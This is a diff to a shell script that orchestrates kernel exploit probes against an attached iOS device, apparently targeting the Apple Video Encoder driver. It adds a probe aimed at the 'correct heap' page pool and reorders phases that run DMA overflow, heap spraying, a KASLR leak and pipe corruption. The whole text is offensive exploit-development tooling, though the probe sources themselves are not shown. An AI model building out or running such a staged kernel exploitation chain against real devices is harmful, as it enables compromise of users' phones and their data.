@@ -51,6 +51,7 @@ echo "[*] Target device: $UDID"
 # Probe definitions: source_file bundle_id app_name
 PROBES=(
     "ave_dma_surgical.c:com.research.avesurgical:AVESurgical"
+    "ave_pixeldata_probe.c:com.research.avepixel:AVEPixel"
     "ave_exploit_probe.c:com.research.aveexploit:AVEExploit"
     "ave_pipe_probe.c:com.research.avepipe:AVEPipe"
     "ave_kaslr_leak.c:com.research.avekaslr:AVEKaslr"
@@ -170,13 +171,18 @@ echo "[Phase 1] Safe baseline tests"
 run_probe "com.research.avesurgical" "info" "AVESurgical" 3
 run_probe "com.research.avesurgical" "spray_check" "AVESurgical" 5
 
-echo "[Phase 2] Minimal DMA overflow"
+echo "[Phase 2] Pixel data probe (CORRECT HEAP — page pool)"
+run_probe "com.research.avepixel" "baseline" "AVEPixel" 5
+run_probe "com.research.avepixel" "pixel_ntl9" "AVEPixel" 8
+run_probe "com.research.avepixel" "multi_round" "AVEPixel" 60
+
+echo "[Phase 3] Legacy probes (wrong heap, kept for comparison)"
 run_probe "com.research.avesurgical" "spray_ntl9" "AVESurgical" 8
 
-echo "[Phase 3] KASLR leak attempts"
+echo "[Phase 4] KASLR leak attempts"
 run_probe "com.research.avekaslr" "spray_leak" "AVEKaslr" 8
 
-echo "[Phase 4] Pipe corruption"
+echo "[Phase 5] Pipe corruption"
 run_probe "com.research.avepipe" "pipe_spray" "AVEPipe" 5
 run_probe "com.research.avepipe" "pipe_ntl9" "AVEPipe" 10
 
